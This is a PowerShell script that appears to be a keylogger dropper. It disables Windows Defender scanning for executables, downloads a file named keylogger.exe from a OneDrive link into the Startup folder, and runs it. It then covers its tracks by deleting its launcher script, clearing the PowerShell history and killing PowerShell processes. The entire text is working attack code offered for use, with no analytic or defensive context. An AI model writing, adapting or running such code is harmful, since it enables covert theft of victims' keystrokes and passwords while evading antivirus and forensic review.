cd $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup #Go to the folder in which we will donwload files
Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
wget https://public.am.files.1drv.com/y4mRU-LVTT3TcTcMbVVXMaON06CbHlUL4U806uJ9a3wt935O6tptdqRYc-D40owg6xRKf2Q347KXwkgwIx9sgVPi20_XqesRG0IaLOglhm-xpocFH5AU99yWdy5-bYt0zydzJggbYBtyIg3j_obD_9zILJJgojgPyuYsjH1kB_4nuvBFoWNoIHlHaLVzR46g_rLQ1AjhsfVYHBx6T8q8WYaoVZJzsAAIPaAkm8x8vqK5hA -O keylogger.exe
Add-MpPreference -ExclusionPath $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup\keylogger.exe -Force #Add exception for keylogger.exe file in antivirus
start keylogger.exe
Remove-MpPreference -ExclusionExtension exe -Force
Remove-MpPreference -ExclusionExtension ps1 -Force
Set-ExecutionPolicy restricted -Force
Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file take a minute to be created)
del C:\Users\Public\Documents\startScript.ps1
Clear-Content (Get-PSReadlineOption).HistorySavePath
taskkill -F /IM powershell.exe